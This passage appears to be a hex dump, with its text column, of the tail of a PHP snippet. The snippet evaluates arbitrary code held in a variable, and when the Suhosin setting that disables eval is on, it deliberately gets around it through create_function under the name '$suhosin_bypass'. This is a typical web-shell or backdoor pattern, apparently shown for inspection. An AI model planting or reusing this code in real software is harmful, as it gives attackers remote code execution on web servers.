29 20 26 26 20 69 6E 69  5F 67 65 74 28 27 73 75  ) && ini _get('su
68 6F 73 69 6E 2E 65 78  65 63 75 74 6F 72 2E 64  hosin.ex ecutor.d
69 73 61 62 6C 65 5F 65  76 61 6C 27 29 29 20 7B  isable_e val')) {
20 24 73 75 68 6F 73 69  6E 5F 62 79 70 61 73 73   $suhosi n_bypass
3D 63 72 65 61 74 65 5F  66 75 6E 63 74 69 6F 6E  =create_ function
28 27 27 2C 20 24 62 29  3B 20 24 73 75 68 6F 73  ('', $b) ; $suhos
69 6E 5F 62 79 70 61 73  73 28 29 3B 20 7D 20 65  in_bypas s(); } e
6C 73 65 20 7B 20 65 76  61 6C 28 24 62 29 3B 20  lse { ev al($b); 
7D 20 64 69 65 28 29 3B                           } die(); 
- - - - - - - - - - - -  - - - - - - - - - - - -  - - - - - - - - -

